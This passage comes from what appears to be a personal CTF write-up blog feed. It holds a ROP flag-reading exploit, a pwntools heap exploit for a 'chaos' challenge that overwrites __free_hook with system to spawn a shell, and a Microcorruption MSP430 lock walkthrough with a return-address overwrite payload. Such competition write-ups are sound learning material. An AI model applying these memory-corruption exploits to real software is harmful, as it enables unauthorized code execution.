class="number">0x0000000000001b92</span></span><br><span class="line">    pop_rax_ret = libc_base + <span class="number">0x000000000003a738</span></span><br><span class="line">    pop_rdx_rsi_ret = libc_base + <span class="number">0x115189</span></span><br><span class="line">    pop_rdx_r10_ret = libc_base + <span class="number">0x115164</span></span><br><span class="line">    ret = <span class="number">0x115167</span></span><br><span class="line">    syscall_ret = libc_base + <span class="number">0x00000000000bc3f5</span></span><br><span class="line"></span><br><span class="line">    flag_address = rbp - <span class="number">0x70</span></span><br><span class="line">    buf = libc_base + <span class="number">0x3C6620</span>  <span class="comment"># libc bss</span></span><br><span class="line">    ptr = <span class="number">0x400740</span></span><br><span class="line">    stake = libc_base + <span class="number">0x20920</span></span><br><span class="line">    </span><br><span class="line">    rop = p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">    rop += p64(pop_rdi_ret) + p64(flag_address) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(syscall_ret)</span><br><span class="line">    rop += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">    rop += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(buf) + p64(pop_rdx_ret) + p64(<span class="number">0x30</span>) + p64(syscall_ret)</span><br><span class="line">    rop += p64(pop_rax_ret) + p64(<span class="number">1</span>) </span><br><span class="line">    rop += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(buf) + p64(pop_rdx_ret) + p64(<span class="number">0x30</span>) + p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">    filename = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">    padding = <span class="number">0x68</span> - <span class="built_in">len</span>(filename)</span><br><span class="line"></span><br><span class="line">    payload = filename</span><br><span class="line">    payload += <span class="string">&#x27;\x00&#x27;</span> * padding</span><br><span class="line">    payload += p64(canary)</span><br><span class="line">    payload += p64(rbp) + rop</span><br><span class="line">    echo(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    sa(<span class="string">&#x27;?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>天翼杯</title>
      <link href="2021/09/23/%E5%A4%A9%E7%BF%BC%E6%9D%AF/"/>
      <url>2021/09/23/%E5%A4%A9%E7%BF%BC%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="chaos"><a href="#chaos" class="headerlink" title="chaos"></a>chaos</h2><p>一大堆花里胡哨的逻辑，分析出来就不难了，但是就是难在分析（<br>就出了这一道题，心累<br>主函数逻辑大概就是构造一个opcode的键和一个passwd的键就能绕过去while循环然后进入下面的菜单逻辑<br>漏洞在于可以改掉size，实现一个类似于UAF的效果<br>利用漏洞就不难了，泄露地址改__free_hook即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./chall&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;/glibc/x64/1.4_2.27/libc.so.6&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;./libc-2.27.so&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        <span class="comment"># io = gdb.debug(challenge, &#x27;b *$rebase(0x0DB5)&#x27;)</span></span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;8.134.37.86&quot;</span>, <span class="number">29380</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print chall&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span>(<span class="params">menu</span>):</span></span><br><span class="line">    ru(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> menu == <span class="string">&#x27;add&#x27;</span>:</span><br><span class="line">        payload = <span class="string">&#x27;opcode:1\npasswd:Cr4at3x\n\x0a&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> menu == <span class="string">&#x27;edit&#x27;</span>:</span><br><span class="line">        payload = <span class="string">&#x27;opcode:3\npasswd:Ed1tx\n\x0a&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> menu == <span class="string">&#x27;show&#x27;</span>:</span><br><span class="line">        payload = <span class="string">&#x27;opcode:2\npasswd:SH0wx\n\x0a&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> menu == <span class="string">&#x27;free&#x27;</span>:</span><br><span class="line">        payload = <span class="string">&#x27;opcode:4\npasswd:D3l4tex\n\x0a&#x27;</span></span><br><span class="line">    sd(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck_add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    sa(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, content)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck_show</span>(<span class="params">index</span>):</span></span><br><span class="line">    sa(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck_edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    sa(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sa(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck_free</span>(<span class="params">index</span>):</span></span><br><span class="line">    sa(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    fuck(<span class="string">&#x27;add&#x27;</span>)</span><br><span class="line">    fuck_add(size, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    fuck(<span class="string">&#x27;show&#x27;</span>)</span><br><span class="line">    fuck_show(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    fuck(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">    fuck_free(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    fuck(<span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line">    fuck_edit(index, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x208</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x208</span>) <span class="comment"># 2</span></span><br><span class="line">    add(<span class="number">0x208</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">0x208</span>) <span class="comment"># 1</span></span><br><span class="line">    add(<span class="number">0x208</span>, <span class="string">&#x27;c&#x27;</span> * <span class="number">0x208</span>) <span class="comment"># 0</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">&#x27;b&#x27;</span> * <span class="number">0x208</span>)</span><br><span class="line">    heap = uu64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]) - <span class="number">0x30</span>  <span class="comment"># the first chunk address</span></span><br><span class="line">    echo(<span class="string">&#x27;The First chunk:&#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line">        edit(<span class="number">1</span>, <span class="number">0x208</span> * <span class="string">&#x27;a&#x27;</span> + p64(heap + <span class="number">0x30</span>))</span><br><span class="line">        edit(<span class="number">2</span>, p64(<span class="number">0</span>) * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x208</span> * <span class="string">&#x27;a&#x27;</span> + p64(heap + <span class="number">0x70</span>))</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    leak = uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]  <span class="comment"># the first chunk address</span></span><br><span class="line">    echo(<span class="string">&#x27;LIBC:&#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">    chunk2 = heap + <span class="number">0x270</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1e0</span> / <span class="number">0x20</span>):</span><br><span class="line">        show(<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># free(1)</span></span><br><span class="line">    <span class="comment"># edit(0, 0x208 * &#x27;a&#x27; + p64(chunk2))</span></span><br><span class="line">    victim = heap + <span class="number">0x30</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x208</span> * <span class="string">&#x27;a&#x27;</span> + p64(victim))</span><br><span class="line">    edit(<span class="number">0</span>, p64(heap))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">        add(<span class="number">0x20</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)    <span class="comment"># 0 -&gt; 2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Notice that the chunk sequence number now needs to be incremented by one</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    dbg()</span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x208</span> + p64(chunk2))</span><br><span class="line"></span><br><span class="line">    libc.address = leak</span><br><span class="line">    __free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    edit(<span class="number">2</span>, p64(__free_hook))</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x8</span>, p64(system))</span><br><span class="line"></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    gdba()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack The &quot;Lockitall LockIT Pro&quot; System</title>
      <link href="2021/09/20/Lockitall-LockIT-Pro/"/>
      <url>2021/09/20/Lockitall-LockIT-Pro/</url>
      
        <content type="html"><![CDATA[<p>When I was bored, I was reading an open source book project initiated by the “Digital Intelligence Security” Research Institute, mainly about a manual about iot security, which introduced a smart door lock CTF. <a href="https://microcorruption.com/">Microcorruption</a> is a smart lock online CTF “game” made by Matasano Security and Square. This CTF focuses on embedded security and challenges players to reverse engineer a fictitious “Lockitall LockIT Pro” lock system.</p><p>How it all works:</p><blockquote><p>tl;dr: Given a debugger and a device, find an input that unlocks it. Solve the level with that input.</p><p>You’ve been given access to a device that controls a lock. Your job: defeat the lock by exploiting bugs in the device’s code.</p><p>You’re playing “Capture The Flag”. You collect points for each level you beat, working your way through steadily more complicated vulnerabilities. Most levels showcase a single kind of real-world software flaw; some levels chain a series of them together.</p><p>This device has a simple input: you provide a passcode, and if the passcode is correct, the lock unlocks. Just one problem: you don’t know the passcode. Unlock it anyways.</p><p>We’ve done the tedious work for you: we got the device working, hooked a rudimentary debugger up to it, dumped the code for each level and disassembled it for you.</p><p>You’ll use the debugger to reverse-engineer the code for each level. You can provide the device with input, then step through the code watching what the device does what that input. You’re looking for a specific input that unlocks the device. Maybe that input is the correct passcode. More likely, though, it’s something else: an input that exploits a bug in the device’s code.</p></blockquote><p>This blog post will record my process of solving door locks in “all over the world”. So far I have broken two door locks, both of them are simple, and I am very lazy so I only record from the next door lock :)</p><h2 id="Sydney"><a href="#Sydney" class="headerlink" title="Sydney"></a>Sydney</h2><p>Firstly enter the command “c” to let the debugger interrupt where the password is entered, enter a password at random and observe its execution flow in the program.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gun8rkzoo9j61pp0u07bm02.jpg" alt=""></p><p>Enter the command “f” to let the pc finish executing the current function and return to the main function. The “check_password” function below should be very interesting.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gun8usn473j61t00u0wo002.jpg" alt=""></p><p>After entering “check_password” function, you can see that there is the following comparision, which compares the two characters starting from the 0th, 2nd, 4th, and 6th digits of our input, respectively.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gunyeas2g2j61360s4gqs02.jpg" alt=""></p><p>So the password in hexadecimal should be as follows: 3c31734d51263857. i.e.  “&lt;1sMQ&amp;8W”.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gunygvvznij60di04674h02.jpg" alt=""></p><p>Oh my bad, the MSP430 uses the instruction set is a little-endian, so the data in memory still need to swap.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gunyrc7ph1j60d003maa802.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gunyrzpruhj618o0gw41802.jpg" alt=""></p><h2 id="Hanoi"><a href="#Hanoi" class="headerlink" title="Hanoi"></a>Hanoi</h2><p>The first test is still performed by entering a random password.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gunyyhweifj61le0nc45t02.jpg" alt=""></p><p>This function may be of interest to us, go in and take a look.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gunz2maweuj61gr0u0th302.jpg" alt=""></p><p>The fution calls another funciton, and notice that the address where we entered the password is also pushed onto the stack before.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gunzenacwyj60ri064mxr02.jpg" alt=""></p><p>Looking at the output, it seems that this function just checked the length of the password we entered or something like that.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gunzowrp9yj61pu0qcqas02.jpg" alt=""></p><p>The key code seems to be in this position: both to ensure that the password length is between 8 and 16 bits, and that the 17th bit has to do a comparision, which should be the familiar pwn technique.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gunzx809ukj619f0u043s02.jpg" alt=""></p><p>Bypass directly with 00 truncation.</p><h2 id="Cusco"><a href="#Cusco" class="headerlink" title="Cusco"></a>Cusco</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guo089j0orj61ko0u0gtr02.jpg" alt=""></p><p>We just noticed that there is an interrupt here and we checked the manual to find the following information:</p><blockquote><p>INT 0x7D.<br>Interface with the HSM-1. Set a flag in memory if the password passed in is correct.<br>Takes two arguments. The first argument is the password to test, the second is the location of a flag to overwrite if the password is correct.</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guo1wd4fjvj60oc0b875h02.jpg" alt=""></p><p>The judgment logic of the main function is “test r15”, but when we go to the place shown in the figure, we find that r15 is always 0. Are we going to hijack the flow of the program?</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guo2h30p9sj61na0oeagm02.jpg" alt=""></p><p>Put a segment at the ret of the main function to see if the address of the ret we can control.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guo2iupbhqj61iz0u07cn02.jpg" alt=""></p><p>Oh dear, this place is really controllable, then everything is easy, just change the ret address to unlock address directly.</p><p>offset = 0x10</p><p>And the address of unlock:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4528:  b012 4644      call#0x4446 &lt;unlock_door&gt;</span><br></pre></td></tr></table></figure><p>payload = (hex)616161616161616161616161616161614644</p><h2 id="Reykjavik"><a href="#Reykjavik" class="headerlink" title="Reykjavik"></a>Reykjavik</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guo2uh7nwgj61gk0ouqad02.jpg" alt=""></p><p>When the password was entered, the pc pointer pointed to a strange location.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guo2vw74oej60os09omyj02.jpg" alt=""></p><p>By looking at the main function, it seems that some encryption has been done to the code. Then we will not let the program run first and locate the enc function directly to observe its logic.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guo33gc72nj61q00sqthd02.jpg" alt=""></p><p>You can see that the first thing is to loop 0x100 times to fill the memory with this data somewhere. This memory is later processed in various ways, and we jump out of the function to see the result after encryption.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guo3bthsx5j61l00u0na602.jpg" alt=""></p><p>Debug cannot parse the code pointed to by pc, we disassemble it manually.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0b12           pushr11</span><br><span class="line">0412           pushr4</span><br><span class="line">0441           movsp, r4</span><br><span class="line">2452           add#0x4, r4</span><br><span class="line">3150 e0ff      add#0xffe0, sp</span><br><span class="line">3b40 2045      mov#0x4520, r11</span><br><span class="line">073c           jmp$+0x10</span><br><span class="line">1b53           incr11</span><br><span class="line">8f11           sxtr15</span><br><span class="line">0f12           pushr15</span><br><span class="line">0312           push#0x0</span><br><span class="line">b012 6424      call#0x2464</span><br><span class="line">2152           add#0x4, sp</span><br><span class="line">6f4b           mov.b@r11, r15</span><br><span class="line">4f93           tst.br15</span><br><span class="line">f623           jnz$-0x12</span><br><span class="line">3012 0a00      push#0xa</span><br><span class="line">0312           push#0x0</span><br><span class="line">b012 6424      call#0x2464</span><br><span class="line">2152           add#0x4, sp</span><br><span class="line">3012 1f00      push#0x1f</span><br><span class="line">3f40 dcff      mov#0xffdc, r15</span><br><span class="line">0f54           addr4, r15</span><br><span class="line">0f12           pushr15</span><br><span class="line">2312           push#0x2</span><br><span class="line">b012 6424      call#0x2464</span><br><span class="line">3150 0600      add#0x6, sp</span><br><span class="line">b490 1a02 dcff cmp#0x21a, -0x24(r4)</span><br><span class="line">0520           jnz$+0xc</span><br><span class="line">3012 7f00      push#0x7f</span><br><span class="line">b012 6424      call#0x2464</span><br><span class="line">2153           incdsp</span><br><span class="line">3150 2000      add#0x20, sp</span><br><span class="line">3441           popr4</span><br><span class="line">3b41           popr11</span><br><span class="line">3041           ret</span><br><span class="line">1e41 0200      mov0x2(sp), r14</span><br><span class="line">0212           pushsr</span><br><span class="line">0f4e           movr14, r15</span><br><span class="line">8f10           swpbr15</span><br><span class="line">024f           movr15, sr</span><br><span class="line">32d0 0080      bis#0x8000, sr</span><br><span class="line">b012 1000      call#0x10</span><br><span class="line">3241           popsr</span><br><span class="line">3041           ret</span><br><span class="line">d21a 189a      call&amp;0x9a18</span><br><span class="line">22dc           bis@r12, sr</span><br><span class="line">45b9           bit.br9, r5</span><br><span class="line">4279           subc.br9, sr</span><br><span class="line">2d55           add@r5, r13</span><br><span class="line">858e a4a2      subr14, -0x5d5c(r5)</span><br><span class="line">67d7           bis.b@r7, r7</span><br><span class="line">14ae a119      dadd0x19a1(r14), r4</span><br><span class="line">76f6           and.b@r6+, r6</span><br><span class="line">42cb           bic.br11, sr</span><br><span class="line">1c04 0efa      rrc-0x5f2(r12)</span><br><span class="line">a61b           invalid@r6</span><br><span class="line">74a7           dadd.b@r7+, r4</span><br><span class="line">416b           addc.br11, sp</span><br><span class="line">d237           jge$-0x5a</span><br><span class="line">a253 22e4      incd&amp;0xe422</span><br><span class="line">66af           dadd.b@r15, r6</span><br><span class="line">c1a5 938b      dadd.br5, -0x746d(sp)</span><br><span class="line">8971 9b88      subcsp, -0x7765(r9)</span><br><span class="line">fa9b 6674      cmp.b@r11+, 0x7466(r10)</span><br><span class="line">4e21           jnz$+0x29e</span><br><span class="line">2a6b           addc@r11, r10</span><br><span class="line">b143 9151      mov#-0x1, 0x5191(sp)</span><br><span class="line">3dcc           bic@r12+, r13</span><br><span class="line">a6f5 daa7      and@r5, -0x5826(r6)</span><br><span class="line">db3f           jmp$-0x48</span><br><span class="line">8d3c           jmp$+0x11c</span><br><span class="line">4d18           rrc.br13</span><br><span class="line">4736           jge$-0x370</span><br><span class="line">dfa6 459a 2461 dadd.b-0x65bb(r6), 0x6124(r15)</span><br><span class="line">921d 3291      sxt&amp;0x9132</span><br><span class="line">14e6 8157      xor0x5781(r6), r4</span><br><span class="line">b0fe 2ddd      and@r14+, -0x22d3(pc)</span><br><span class="line">400b           retipc</span><br><span class="line">8688 6310      subr8, 0x1063(r6)</span><br><span class="line">3ab3           bit#-0x1, r10</span><br><span class="line">612b           jnc$-0x13c</span><br><span class="line">0bd9           bisr9, r11</span><br><span class="line">483f           jmp$-0x16e</span><br><span class="line">4e04           rrc.br14</span><br><span class="line">5870 4c38      subc.b0x384c(pc), r8</span><br><span class="line">c93c           jmp$+0x194</span><br><span class="line">ff36           jge$-0x200</span><br><span class="line">0e01           rrar14</span><br><span class="line">7f3e           jmp$-0x300</span><br><span class="line">fa55 aeef      add.b@r5+, -0x1052(r10)</span><br><span class="line">051c           rrcr5</span><br><span class="line">242c           jc$+0x4a</span><br><span class="line">3c56           add@r6+, r12</span><br><span class="line">13af e57b      dadd0x7be5(r15), 4</span><br><span class="line">8abf 3040      bitr15, 0x4030(r10)</span><br><span class="line">c537           jge$-0x74</span><br><span class="line">656e           addc.b@r14, r5</span><br><span class="line">8278 9af9      subcr8, &amp;0xf99a</span><br><span class="line">9d02 be83      call-0x7c42(r13)</span><br><span class="line">b38c e181      sub@r12+, 8</span><br><span class="line">3ad8           bis@r8+, r10</span><br><span class="line">395a           add@r10+, r9</span><br><span class="line">fce3 4f03      xor.b#-0x1, 0x34f(r12)</span><br><span class="line">8ec9 9395      bicr9, -0x6a6d(r14)</span><br><span class="line">4a15           rra.br10</span><br><span class="line">ce3b           jl$-0x62</span><br><span class="line">fd1e           call@r13+</span><br><span class="line">7779           subc.b@r9+, r7</span><br><span class="line">c9c3 5ff2      bic.b#0x0, -0xda1(r9)</span><br><span class="line">3dc7           bic@r7+, r13</span><br><span class="line">5953           add.b#0x1, r9</span><br><span class="line">8826           jz$-0x2ee</span><br><span class="line">d0b5 d9f8 639e bit.b-0x727(r5), -0x619d(pc)</span><br><span class="line">e970 01cd      subc.b@pc, -0x32ff(r9)</span><br><span class="line">2119           rra@sp</span><br><span class="line">ca6a d12c      addc.br10, 0x2cd1(r10)</span><br><span class="line">97e2 7538 96c5 xor&amp;0x3875, -0x3a6a(r7)</span><br><span class="line">8f28           jnc$+0x120</span><br><span class="line">d682 1be5 ab20 sub.b&amp;0xe51b, 0x20ab(r6)</span><br><span class="line">7389           sub.b@r9+, 4</span><br><span class="line">48aa           dadd.br10, r8</span><br><span class="line">1fa3           dincr15</span><br><span class="line">472f           jc$-0x170</span><br><span class="line">a564 de2d      addc@r4, 0x2dde(r5)</span><br><span class="line">b710           swpb@r7+</span><br><span class="line">9081 5205 8d44 sub0x552(sp), 0x448d(pc)</span><br><span class="line">cff4 bc2e      and.br4, 0x2ebc(r15)</span><br><span class="line">577a d5f4      subc.b-0xb2b(r10), r7</span><br><span class="line">a851 c243      add@sp, 0x43c2(r8)</span><br><span class="line">277d           subc@r13, r7</span><br><span class="line">a4ca 1e6b      bic@r10, 0x6b1e(r4)</span><br></pre></td></tr></table></figure><p>We can find that the code segment “call    #0x2464” was called in many places.</p><p>The code segment : </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1e41 0200      mov0x2(sp), r14</span><br><span class="line">0212           pushsr</span><br><span class="line">0f4e           movr14, r15</span><br><span class="line">8f10           swpbr15</span><br><span class="line">024f           movr15, sr</span><br><span class="line">32d0 0080      bis#0x8000, sr</span><br><span class="line">b012 1000      call#0x10&#x2F;&#x2F; interrupt</span><br><span class="line">3241           popsr</span><br><span class="line">3041           ret</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gupi52jvrkj61kf0u0qc002.jpg" alt=""></p><p>The program calls the interrupt for user input in the subsequent execution. After entering the password, there is a “cmp” instruction that follows, which can be seen to compare with the password we entered. Notice the value of the pc is 2448 now. So we can break at 2448, then we can input “#021a” to observe the program.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gupizmo924j616k0padjh02.jpg" alt=""></p><p>Oh! Sure enough, that’s it.</p><h2 id="Whitehorse"><a href="#Whitehorse" class="headerlink" title="Whitehorse"></a>Whitehorse</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gupj4kd1g4j61d60u0ahy02.jpg" alt=""></p><p>When set a breakpoint at ret of the function, we can find that ret address can be overflowed so we can hijack the program flow.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gupjrwu60fj61zi0oin3z02.jpg" alt=""></p><p>The verfication of the password relies on the “r15” register. So we can hijack the program flow to control the “r15” 